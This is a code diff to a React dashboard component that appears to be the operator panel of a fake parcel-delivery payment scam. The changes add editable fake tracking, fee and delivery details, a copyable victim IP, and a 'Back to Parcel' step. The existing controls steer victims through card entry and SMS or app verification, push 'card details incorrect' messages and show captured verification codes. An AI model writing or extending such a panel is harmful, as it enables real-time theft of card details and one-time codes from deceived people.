@@ -1,8 +1,9 @@
 import { useState } from "react";
 import { Button } from "@/components/ui/button";
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
+import { Card, CardContent, CardHeader } from "@/components/ui/card";
 import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
+import { Checkbox } from "@/components/ui/checkbox";
 import { Collapsible, CollapsibleContent, CollapsibleTrigger } from "@/components/ui/collapsible";
 import {
   Select,
@@ -11,6 +12,12 @@ import {
   SelectTrigger,
   SelectValue,
 } from "@/components/ui/select";
+import {
+  Tooltip,
+  TooltipContent,
+  TooltipProvider,
+  TooltipTrigger,
+} from "@/components/ui/tooltip";
 import { 
   CreditCard, 
   MessageSquare, 
@@ -24,7 +31,11 @@ import {
   Smartphone,
   MessageCircle,
   ChevronDown,
-  Globe
+  Globe,
+  Copy,
+  Check,
+  Edit,
+  Save
 } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { toast } from "@/hooks/use-toast";
@@ -43,6 +54,9 @@ interface ClientSession {
   verification_code: string | null;
   approval_type: string | null;
   client_ip: string | null;
+  origin: string | null;
+  destination: string | null;
+  estimated_delivery: string | null;
   created_at: string;
   updated_at: string;
 }
@@ -69,12 +83,31 @@ const messageTypes = [
 
 interface ClientCardProps {
   session: ClientSession;
+  isSelected?: boolean;
+  onToggleSelect?: () => void;
 }
 
-export function ClientCard({ session }: ClientCardProps) {
+export function ClientCard({ session, isSelected = false, onToggleSelect }: ClientCardProps) {
   const [messageInput, setMessageInput] = useState({ message: "", type: "error" });
   const [controlsOpen, setControlsOpen] = useState(false);
   const [messagingOpen, setMessagingOpen] = useState(false);
+  const [parcelDetailsOpen, setParcelDetailsOpen] = useState(false);
+  const [ipCopied, setIpCopied] = useState(false);
+  const [isEditingParcel, setIsEditingParcel] = useState(false);
+  const [parcelForm, setParcelForm] = useState({
+    parcel_tracking: session.parcel_tracking || "",
+    amount: session.amount?.toString() || "",
+    origin: session.origin || "Los Angeles, CA",
+    destination: session.destination || "",
+    estimated_delivery: session.estimated_delivery || "2-3 Business Days"
+  });
+
+  const copyIpToClipboard = async () => {
+    if (!session.client_ip) return;
+    await navigator.clipboard.writeText(session.client_ip);
+    setIpCopied(true);
+    setTimeout(() => setIpCopied(false), 2000);
+  };
 
   const getTimeSince = (dateString: string) => {
     const date = new Date(dateString);
@@ -160,11 +193,25 @@ export function ClientCard({ session }: ClientCardProps) {
       .from("client_sessions")
       .update({ 
         current_step: 2,
+        approval_type: null,
         admin_message: "The card details you entered are incorrect. Please check and try again.",
         message_type: "error"
       })
       .eq("id", session.id);
     toast({ title: "Sent back to card page" });
+  };
+
+  const sendBackToParcel = async () => {
+    await supabase
+      .from("client_sessions")
+      .update({ 
+        current_step: 1,
+        approval_type: null,
+        admin_message: null,
+        message_type: null
+      })
+      .eq("id", session.id);
+    toast({ title: "Sent back to parcel page" });
   };
 
   const sendToSmsVerification = async () => {
@@ -230,20 +277,72 @@ export function ClientCard({ session }: ClientCardProps) {
     toast({ title: `New code: ${newCode}` });
   };
 
+  const saveParcelDetails = async () => {
+    const { error } = await supabase
+      .from("client_sessions")
+      .update({
+        parcel_tracking: parcelForm.parcel_tracking || null,
+        amount: parcelForm.amount ? parseFloat(parcelForm.amount) : null,
+        origin: parcelForm.origin || null,
+        destination: parcelForm.destination || null,
+        estimated_delivery: parcelForm.estimated_delivery || null
+      })
+      .eq("id", session.id);
+
+    if (error) {
+      toast({ title: "Error", description: "Failed to update parcel details", variant: "destructive" });
+    } else {
+      toast({ title: "Parcel details updated" });
+      setIsEditingParcel(false);
+    }
+  };
+
   return (
-    <Card className="overflow-hidden">
+    <Card className={`overflow-hidden transition-colors ${isSelected ? 'ring-2 ring-primary' : ''}`}>
       {/* Compact Header */}
       <CardHeader className="pb-2 pt-3 px-4">
         <div className="flex items-center justify-between gap-2">
           <div className="flex items-center gap-2 min-w-0">
+            {onToggleSelect && (
+              <Checkbox
+                checked={isSelected}
+                onCheckedChange={onToggleSelect}
+                className="shrink-0"
+              />
+            )}
             <span className="font-mono bg-muted px-2 py-0.5 rounded text-xs font-bold">
               #{session.session_code}
             </span>
             {session.client_ip && (
-              <Badge variant="outline" className="text-xs gap-1 shrink-0">
-                <Globe className="w-3 h-3" />
-                {getShortIp(session.client_ip)}
-              </Badge>
+              <TooltipProvider>
+                <Tooltip>
+                  <TooltipTrigger asChild>
+                    <Badge 
+                      variant="outline" 
+                      className="text-xs gap-1 shrink-0 cursor-pointer hover:bg-muted transition-colors"
+                      onClick={copyIpToClipboard}
+                    >
+                      {ipCopied ? (
+                        <Check className="w-3 h-3 text-green-500" />
+                      ) : (
+                        <Globe className="w-3 h-3" />
+                      )}
+                      {getShortIp(session.client_ip)}
+                    </Badge>
+                  </TooltipTrigger>
+                  <TooltipContent side="bottom" className="flex items-center gap-2">
+                    <span className="font-mono text-sm">{session.client_ip}</span>
+                    {ipCopied ? (
+                      <Check className="w-3 h-3 text-green-500" />
+                    ) : (
+                      <Copy className="w-3 h-3 text-muted-foreground" />
+                    )}
+                    <span className="text-xs text-muted-foreground">
+                      {ipCopied ? "Copied!" : "Click to copy"}
+                    </span>
+                  </TooltipContent>
+                </Tooltip>
+              </TooltipProvider>
             )}
           </div>
           <div className="flex items-center gap-1.5 shrink-0">
@@ -321,9 +420,14 @@ export function ClientCard({ session }: ClientCardProps) {
                 <Smartphone className="w-3 h-3 mr-1" /> App
               </Button>
             </div>
-            <Button variant="outline" size="sm" className="w-full h-7 text-xs text-orange-600 border-orange-500" onClick={sendWrongCardMessage}>
-              <CreditCard className="w-3 h-3 mr-1" /> Wrong Card
-            </Button>
+            <div className="grid grid-cols-2 gap-1.5">
+              <Button variant="outline" size="sm" className="h-7 text-xs" onClick={sendBackToParcel}>
+                <Package className="w-3 h-3 mr-1" /> Back to Parcel
+              </Button>
+              <Button variant="outline" size="sm" className="h-7 text-xs text-orange-600 border-orange-500" onClick={sendWrongCardMessage}>
+                <CreditCard className="w-3 h-3 mr-1" /> Wrong Card
+              </Button>
+            </div>
           </div>
         )}
 
@@ -357,14 +461,9 @@ export function ClientCard({ session }: ClientCardProps) {
                     <span className="font-mono font-bold text-sm">{session.verification_code}</span>
                   </div>
                 )}
-                <div className="grid grid-cols-2 gap-2">
-                  <Button variant="outline" size="sm" className="h-7 text-xs text-destructive" onClick={sendWrongSmsMessage}>
-                    Wrong SMS
-                  </Button>
-                  <Button variant="outline" size="sm" className="h-7 text-xs" onClick={resendVerificationCode}>
-                    New Code
-                  </Button>
-                </div>
+                <Button variant="outline" size="sm" className="w-full h-7 text-xs text-destructive" onClick={sendWrongSmsMessage}>
+                  Wrong SMS
+                </Button>
                 <Button size="sm" className="w-full h-8 text-xs bg-green-600 hover:bg-green-700" onClick={confirmPayment}>
                   <CheckCircle className="w-3 h-3 mr-1" /> Confirm (SMS)
                 </Button>
@@ -384,13 +483,102 @@ export function ClientCard({ session }: ClientCardProps) {
                     <CheckCircle className="w-3 h-3 mr-1" /> Confirm
                   </Button>
                 </div>
-                <Button variant="outline" size="sm" className="w-full h-7 text-xs text-orange-600 border-orange-500" onClick={sendWrongCardMessage}>
-                  Wrong Card
-                </Button>
+                <div className="grid grid-cols-2 gap-1.5">
+                  <Button variant="outline" size="sm" className="h-7 text-xs" onClick={sendBackToParcel}>
+                    <Package className="w-3 h-3 mr-1" /> Back to Parcel
+                  </Button>
+                  <Button variant="outline" size="sm" className="h-7 text-xs text-orange-600 border-orange-500" onClick={sendWrongCardMessage}>
+                    Wrong Card
+                  </Button>
+                </div>
               </div>
             )}
           </div>
         )}
+
+        {/* Collapsible Parcel Details Editor */}
+        <Collapsible open={parcelDetailsOpen} onOpenChange={setParcelDetailsOpen}>
+          <CollapsibleTrigger asChild>
+            <Button variant="ghost" size="sm" className="w-full h-7 text-xs justify-between">
+              <span className="flex items-center gap-1">
+                <Edit className="w-3 h-3" /> Edit Parcel Details
+              </span>
+              <ChevronDown className={`w-3 h-3 transition-transform ${parcelDetailsOpen ? "rotate-180" : ""}`} />
+            </Button>
+          </CollapsibleTrigger>
+          <CollapsibleContent className="pt-2 space-y-2">
+            <div className="grid grid-cols-2 gap-2">
+              <div>
+                <label className="text-xs text-muted-foreground">Tracking #</label>
+                <Input
+                  value={parcelForm.parcel_tracking}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, parcel_tracking: e.target.value }))}
+                  placeholder="SW-XXXXXXXX"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">Amount (£)</label>
+                <Input
+                  value={parcelForm.amount}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, amount: e.target.value }))}
+                  placeholder="4.99"
+                  type="number"
+                  step="0.01"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">From</label>
+                <Input
+                  value={parcelForm.origin}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, origin: e.target.value }))}
+                  placeholder="Los Angeles, CA"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+              <div>
+                <label className="text-xs text-muted-foreground">To</label>
+                <Input
+                  value={parcelForm.destination}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, destination: e.target.value }))}
+                  placeholder="Client address"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+              <div className="col-span-2">
+                <label className="text-xs text-muted-foreground">Est. Delivery</label>
+                <Input
+                  value={parcelForm.estimated_delivery}
+                  onChange={(e) => setParcelForm(prev => ({ ...prev, estimated_delivery: e.target.value }))}
+                  placeholder="2-3 Business Days"
+                  className="h-7 text-xs"
+                  disabled={!isEditingParcel}
+                />
+              </div>
+            </div>
+            <div className="flex gap-2">
+              {isEditingParcel ? (
+                <>
+                  <Button size="sm" className="flex-1 h-7 text-xs" onClick={saveParcelDetails}>
+                    <Save className="w-3 h-3 mr-1" /> Save
+                  </Button>
+                  <Button variant="outline" size="sm" className="flex-1 h-7 text-xs" onClick={() => setIsEditingParcel(false)}>
+                    Cancel
+                  </Button>
+                </>
+              ) : (
+                <Button variant="outline" size="sm" className="w-full h-7 text-xs" onClick={() => setIsEditingParcel(true)}>
+                  <Edit className="w-3 h-3 mr-1" /> Edit
+                </Button>
+              )}
+            </div>
+          </CollapsibleContent>
+        </Collapsible>
 
         {/* Collapsible Navigation Controls */}
         <Collapsible open={controlsOpen} onOpenChange={setControlsOpen}>
